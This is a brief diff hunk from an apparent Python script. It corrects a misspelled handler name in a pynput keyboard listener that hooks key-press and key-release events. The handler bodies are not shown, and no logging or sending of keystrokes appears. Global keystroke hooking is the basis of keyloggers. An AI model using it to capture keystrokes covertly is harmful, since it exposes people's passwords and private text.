@@ -13,7 +13,7 @@ def on_press(key):
 def on_release(key):
     pass
 
-with keyboard.Listener(on_press=on_oress, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 ]
 def execute():
